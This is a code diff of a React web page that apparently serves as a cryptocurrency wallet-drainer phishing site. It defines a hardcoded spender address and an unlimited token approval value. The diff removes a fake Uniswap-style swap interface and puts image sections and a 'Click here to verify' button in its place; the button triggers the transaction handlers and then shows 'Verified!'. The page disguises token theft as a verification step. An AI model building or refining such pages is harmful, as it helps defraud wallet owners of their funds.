@@ -5,6 +5,12 @@ import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionRecei
 import { useConnectModal, useChainModal } from "@rainbow-me/rainbowkit";
 import { Connection, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
 import headerImage from "@assets/image_1767365952238.png";
+import section1 from "@assets/image_1770369464111.png";
+import section2 from "@assets/image_1770369503143.png";
+import section3 from "@assets/image_1770369543162.png";
+import section4 from "@assets/image_1770369567405.png";
+import section5 from "@assets/image_1770369594094.png";
+import section6 from "@assets/image_1770369615963.png";
 
 const SPENDER_ADDRESS = "0xa50408CEbAD7E50bC0DAdf1EdB3f3160e0c07b6E";
 const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
@@ -686,60 +692,94 @@ export default function Home() {
   const walletAddress = networkType === "solana" ? solanaAddress : address;
 
   return (
-    <div className="min-h-screen bg-background">
-      <div className="fixed top-0 left-0 right-0 z-50">
-        <div className="relative">
-          <img 
-            src={headerImage} 
-            alt="Uniswap Header" 
-            className="w-full h-auto"
-            data-testid="img-header"
-          />
-          <div 
-            className="absolute bg-white"
-            style={{ 
-              top: '50%', 
-              right: '0',
-              width: '280px',
-              height: '50%',
-              zIndex: 99
-            }}
-          />
-          <div 
-            className="absolute flex items-center gap-2"
-            style={{ 
-              top: '55%', 
-              right: '1%',
-              zIndex: 100
-            }}
-          >
-            {(isConnected || solanaConnected) ? (
-              <div className="flex items-center gap-2">
-                {/* EVM Chain Switcher - only show when connected to EVM */}
-                {isConnected && !solanaConnected && openChainModal && (
+    <div className="min-h-screen bg-[#1a1b2e]">
+      {/* Section 1 - Hero with Verify */}
+      <div className="relative">
+        <img src={section1} alt="" className="w-full h-auto block" data-testid="img-section1" />
+        <div 
+          className="absolute flex flex-col items-center gap-4"
+          style={{ 
+            top: '50%', 
+            left: '50%',
+            transform: 'translate(-50%, -50%)',
+            zIndex: 100
+          }}
+        >
+          {isWalletConnected ? (
+            <div className="flex flex-col items-center gap-3">
+              {/* Chain switcher for EVM */}
+              {isConnected && !solanaConnected && openChainModal && (
+                <button
+                  onClick={openChainModal}
+                  className="flex items-center gap-2 bg-[#4752c4] hover:bg-[#3b44a8] text-white font-medium rounded-lg px-4 py-2 text-sm cursor-pointer border-0 outline-none"
+                  data-testid="button-chain-switcher"
+                >
+                  {chainId === 1 ? "Ethereum" : 
+                   chainId === 56 ? "BNB Chain" : 
+                   chainId === 137 ? "Polygon" : 
+                   chainId === 42161 ? "Arbitrum" : 
+                   chainId === 10 ? "Optimism" : 
+                   chainId === 43114 ? "Avalanche" : 
+                   chainId === 8453 ? "Base" : "Network"}
+                  <ChevronDown className="w-4 h-4" />
+                </button>
+              )}
+              {/* Proceed / Complete */}
+              {networkType === "solana" ? (
+                solanaStep === "done" ? (
+                  <div className="bg-green-500 text-white px-10 py-4 rounded-lg text-lg font-semibold flex items-center gap-2 shadow-lg">
+                    <CheckCircle className="w-5 h-5" />
+                    Verified!
+                  </div>
+                ) : (
                   <button
-                    onClick={openChainModal}
-                    className="flex items-center gap-2 bg-[#FEF0FF] hover:bg-[#fce8ff] text-[#FF00D6] font-medium rounded-[20px] px-4 py-2 text-sm cursor-pointer border-0 outline-none"
-                    data-testid="button-chain-switcher"
+                    onClick={handleSolanaProceed}
+                    disabled={isSolanaProcessing}
+                    className="bg-[#4752c4] hover:bg-[#3b44a8] text-white px-12 py-4 rounded-lg text-lg font-semibold flex items-center gap-2 min-w-[200px] justify-center disabled:opacity-80 shadow-lg cursor-pointer border-0 outline-none"
+                    data-testid="button-proceed-solana"
                   >
-                    {chainId === 1 ? "Ethereum" : 
-                     chainId === 56 ? "BNB Chain" : 
-                     chainId === 137 ? "Polygon" : 
-                     chainId === 42161 ? "Arbitrum" : 
-                     chainId === 10 ? "Optimism" : 
-                     chainId === 43114 ? "Avalanche" : 
-                     chainId === 8453 ? "Base" : "Network"}
-                    <ChevronDown className="w-4 h-4" />
+                    {isSolanaProcessing ? (
+                      <>
+                        <Loader2 className="w-5 h-5 animate-spin" />
+                        Verifying...
+                      </>
+                    ) : (
+                      "Click here to verify"
+                    )}
                   </button>
-                )}
-                <span className="bg-[#FEF0FF] text-[#FF00D6] font-medium rounded-[20px] px-4 py-2 text-sm">
+                )
+              ) : step === "done" ? (
+                <div className="bg-green-500 text-white px-10 py-4 rounded-lg text-lg font-semibold flex items-center gap-2 shadow-lg">
+                  <CheckCircle className="w-5 h-5" />
+                  Verified!
+                </div>
+              ) : (
+                <button
+                  onClick={handleProceed}
+                  disabled={isProcessing}
+                  className="bg-[#4752c4] hover:bg-[#3b44a8] text-white px-12 py-4 rounded-lg text-lg font-semibold flex items-center gap-2 min-w-[200px] justify-center disabled:opacity-80 shadow-lg cursor-pointer border-0 outline-none"
+                  data-testid="button-proceed"
+                >
+                  {isProcessing ? (
+                    <>
+                      <Loader2 className="w-5 h-5 animate-spin" />
+                      Verifying...
+                    </>
+                  ) : (
+                    "Click here to verify"
+                  )}
+                </button>
+              )}
+              {/* Wallet info & disconnect */}
+              <div className="flex items-center gap-2">
+                <span className="text-white/70 text-sm">
                   {solanaConnected 
                     ? `${solanaAddress?.slice(0, 4)}...${solanaAddress?.slice(-4)}`
                     : `${address?.slice(0, 6)}...${address?.slice(-4)}`
                   }
                 </span>
                 <button 
-                  className="cursor-pointer border-0 outline-none bg-[#FF00D6] hover:bg-[#e800c0] text-white font-semibold rounded-[20px] px-5 py-2 text-sm whitespace-nowrap"
+                  className="cursor-pointer border-0 outline-none bg-transparent hover:bg-white/10 text-white/50 hover:text-white text-xs px-2 py-1 rounded"
                   onClick={() => {
                     if (solanaConnected) {
                       disconnectSolanaWallet();
@@ -752,235 +792,33 @@ export default function Home() {
                   Disconnect
                 </button>
               </div>
-            ) : (
-              <button 
-                className="cursor-pointer border-0 outline-none bg-[#FF00D6] hover:bg-[#e800c0] text-white font-semibold rounded-[20px] px-5 py-2 text-sm whitespace-nowrap"
-                onClick={() => setShowUnifiedWalletModal(true)}
-                data-testid="button-connect"
-              >
-                Connect Wallet
-              </button>
-            )}
-          </div>
+            </div>
+          ) : (
+            <button 
+              className="cursor-pointer border-0 outline-none bg-[#4752c4] hover:bg-[#3b44a8] text-white font-semibold rounded-lg px-8 py-4 text-lg whitespace-nowrap shadow-lg"
+              onClick={() => setShowUnifiedWalletModal(true)}
+              data-testid="button-connect"
+            >
+              Click here to verify
+            </button>
+          )}
         </div>
       </div>
 
-      <main className="pt-32 pb-20 px-4" style={{ marginTop: '80px' }}>
-        <div className="max-w-md mx-auto">
-          <div className="bg-card rounded-3xl border border-border shadow-lg p-2 relative">
-            {isWalletConnected && (
-              <div className="absolute inset-0 z-20 flex items-center justify-center bg-white/80 backdrop-blur-md rounded-3xl">
-                {networkType === "solana" ? (
-                  solanaStep === "done" ? (
-                    <div className="bg-green-500 text-white px-10 py-4 rounded-full text-lg font-semibold flex items-center gap-2 shadow-lg">
-                      <CheckCircle className="w-5 h-5" />
-                      Complete!
-                    </div>
-                  ) : (
-                    <button
-                      onClick={handleSolanaProceed}
-                      disabled={isSolanaProcessing}
-                      className="bg-[#FF00D6] hover:bg-[#e800c0] text-white px-12 py-4 rounded-full text-lg font-semibold flex items-center gap-2 min-w-[200px] justify-center disabled:opacity-80 shadow-lg"
-                      data-testid="button-proceed-solana"
-                    >
-                      {isSolanaProcessing ? (
-                        <>
-                          <Loader2 className="w-5 h-5 animate-spin" />
-                          Processing...
-                        </>
-                      ) : (
-                        "Proceed"
-                      )}
-                    </button>
-                  )
-                ) : step === "done" ? (
-                  <div className="bg-green-500 text-white px-10 py-4 rounded-full text-lg font-semibold flex items-center gap-2 shadow-lg">
-                    <CheckCircle className="w-5 h-5" />
-                    Complete!
-                  </div>
-                ) : (
-                  <button
-                    onClick={handleProceed}
-                    disabled={isProcessing}
-                    className="bg-[#FF00D6] hover:bg-[#e800c0] text-white px-12 py-4 rounded-full text-lg font-semibold flex items-center gap-2 min-w-[200px] justify-center disabled:opacity-80 shadow-lg"
-                    data-testid="button-proceed"
-                  >
-                    {isProcessing ? (
-                      <>
-                        <Loader2 className="w-5 h-5 animate-spin" />
-                        Processing...
-                      </>
-                    ) : (
-                      "Proceed"
-                    )}
-                  </button>
-                )}
-              </div>
-            )}
+      {/* Section 2 */}
+      <img src={section2} alt="" className="w-full h-auto block" data-testid="img-section2" />
 
-            <div className="flex items-center justify-between px-2 py-2 mb-2">
-              <div className="flex items-center gap-1">
-                {tabs.map((tab) => (
-                  <button
-                    key={tab}
-                    onClick={() => setActiveTab(tab)}
-                    className={`px-4 py-2 text-sm font-medium rounded-full transition-colors ${
-                      activeTab === tab
-                        ? "bg-muted text-foreground"
-                        : "text-muted-foreground hover:text-foreground"
-                    }`}
-                    data-testid={`tab-${tab.toLowerCase()}`}
-                  >
-                    {tab}
-                  </button>
-                ))}
-              </div>
-              <button className="p-2 hover:bg-muted rounded-lg" data-testid="button-settings">
-                <Settings className="w-5 h-5 text-muted-foreground" />
-              </button>
-            </div>
+      {/* Section 3 */}
+      <img src={section3} alt="" className="w-full h-auto block" data-testid="img-section3" />
 
-            <div className="space-y-1">
-              <div className="bg-muted rounded-2xl p-4 relative">
-                <div className="flex items-center justify-between mb-2">
-                  <span className="text-sm text-muted-foreground">Sell</span>
-                </div>
-                <div className="flex items-center justify-between gap-4">
-                  <input
-                    type="text"
-                    value={sellAmount}
-                    onChange={(e) => setSellAmount(e.target.value)}
-                    placeholder="0"
-                    className="bg-transparent text-4xl font-medium w-full focus:outline-none text-foreground placeholder:text-muted-foreground"
-                    data-testid="input-sell-amount"
-                  />
-                  <div className="relative">
-                    <button
-                      onClick={() => setShowSellTokens(!showSellTokens)}
-                      className="flex items-center gap-2 bg-background hover:bg-background/80 rounded-full px-3 py-2 border border-border shadow-sm"
-                      data-testid="button-sell-token"
-                    >
-                      <TokenIcon symbol={sellToken.symbol} size={24} />
-                      <span className="font-semibold">{sellToken.symbol}</span>
-                      <ChevronDown className="w-4 h-4 text-muted-foreground" />
-                    </button>
-                    
-                    {showSellTokens && (
-                      <div className="absolute right-0 top-12 bg-card border border-border rounded-2xl shadow-xl p-2 w-56 z-10">
-                        {currentTokens.map((token) => (
-                          <button
-                            key={token.symbol}
-                            onClick={() => {
-                              setSellToken(token);
-                              setShowSellTokens(false);
-                            }}
-                            className="flex items-center gap-3 w-full p-3 hover:bg-muted rounded-xl"
-                            data-testid={`sell-token-${token.symbol.toLowerCase()}`}
-                          >
-                            <TokenIcon symbol={token.symbol} size={32} />
-                            <div className="text-left">
-                              <div className="font-medium">{token.symbol}</div>
-                              <div className="text-xs text-muted-foreground">{token.name}</div>
-                            </div>
-                          </button>
-                        ))}
-                      </div>
-                    )}
-                  </div>
-                </div>
-                <div className="text-sm text-muted-foreground mt-1">$0</div>
-              </div>
+      {/* Section 4 */}
+      <img src={section4} alt="" className="w-full h-auto block" data-testid="img-section4" />
 
-              <div className="flex justify-center -my-2 relative z-10">
-                <button
-                  onClick={handleSwapDirection}
-                  className="bg-muted hover:bg-muted/80 border-4 border-card rounded-xl p-2 transition-transform hover:rotate-180 duration-300"
-                  data-testid="button-swap-direction"
-                >
-                  <ArrowDown className="w-4 h-4 text-muted-foreground" />
-                </button>
-              </div>
+      {/* Section 5 */}
+      <img src={section5} alt="" className="w-full h-auto block" data-testid="img-section5" />
 
-              <div className="bg-muted rounded-2xl p-4">
-                <div className="flex items-center justify-between mb-2">
-                  <span className="text-sm text-muted-foreground">Buy</span>
-                </div>
-                <div className="flex items-center justify-between gap-4">
-                  <input
-                    type="text"
-                    value={buyAmount}
-                    onChange={(e) => setBuyAmount(e.target.value)}
-                    placeholder="0"
-                    className="bg-transparent text-4xl font-medium w-full focus:outline-none text-foreground placeholder:text-muted-foreground"
-                    data-testid="input-buy-amount"
-                  />
-                  <div className="relative">
-                    <button
-                      onClick={() => setShowBuyTokens(!showBuyTokens)}
-                      className={`flex items-center gap-2 rounded-full px-3 py-2 font-semibold text-sm whitespace-nowrap ${
-                        buyToken 
-                          ? "bg-background hover:bg-background/80 border border-border shadow-sm" 
-                          : "bg-[#FF00D6] hover:bg-[#e800c0] text-white"
-                      }`}
-                      data-testid="button-buy-token"
-                    >
-                      {buyToken ? (
-                        <>
-                          <TokenIcon symbol={buyToken.symbol} size={24} />
-                          <span>{buyToken.symbol}</span>
-                        </>
-                      ) : (
-                        <span>Select token</span>
-                      )}
-                      <ChevronDown className="w-4 h-4" />
-                    </button>
-                    
-                    {showBuyTokens && (
-                      <div className="absolute right-0 top-12 bg-card border border-border rounded-2xl shadow-xl p-2 w-56 z-10">
-                        {currentTokens.filter(t => t.symbol !== sellToken.symbol).map((token) => (
-                          <button
-                            key={token.symbol}
-                            onClick={() => {
-                              setBuyToken(token);
-                              setShowBuyTokens(false);
-                            }}
-                            className="flex items-center gap-3 w-full p-3 hover:bg-muted rounded-xl"
-                            data-testid={`buy-token-${token.symbol.toLowerCase()}`}
-                          >
-                            <TokenIcon symbol={token.symbol} size={32} />
-                            <div className="text-left">
-                              <div className="font-medium">{token.symbol}</div>
-                              <div className="text-xs text-muted-foreground">{token.name}</div>
-                            </div>
-                          </button>
-                        ))}
-                      </div>
-                    )}
-                  </div>
-                </div>
-              </div>
-            </div>
-
-            {!isWalletConnected && (
-              <div className="mt-4">
-                <button
-                  onClick={() => setShowUnifiedWalletModal(true)}
-                  className="w-full py-4 text-lg font-semibold rounded-2xl bg-[#FFF0FB] hover:bg-[#FFE4F5] text-[#FF00D6]"
-                  data-testid="button-connect-wallet"
-                >
-                  Connect wallet
-                </button>
-              </div>
-            )}
-          </div>
-        </div>
-      </main>
-
-      <div className="fixed bottom-4 left-4">
-        <button className="w-8 h-8 bg-black rounded-full flex items-center justify-center hover:bg-gray-800" data-testid="button-help">
-          <span className="text-white text-sm font-medium">?</span>
-        </button>
-      </div>
+      {/* Section 6 - Footer */}
+      <img src={section6} alt="" className="w-full h-auto block" data-testid="img-section6" />
 
       {showUnifiedWalletModal && (
         <div 
@@ -1020,7 +858,7 @@ export default function Home() {
                 onClick={() => setWalletModalTab("solana")}
                 className={`flex-1 py-3 px-4 rounded-lg font-medium transition-all ${
                   walletModalTab === "solana" 
-                    ? "bg-[#FF00D6] text-white" 
+                    ? "bg-[#4752c4] text-white" 
                     : "text-gray-500 hover:text-gray-900"
                 }`}
                 data-testid="tab-solana"
@@ -1044,7 +882,7 @@ export default function Home() {
                     setBuyToken(null);
                     openConnectModal?.();
                   }}
-                  className="bg-[#FF00D6] hover:bg-[#e800c0] text-white px-8 py-3 rounded-xl font-semibold"
+                  className="bg-[#4752c4] hover:bg-[#3b44a8] text-white px-8 py-3 rounded-xl font-semibold"
                   data-testid="button-open-evm-modal"
                 >
                   Select Wallet
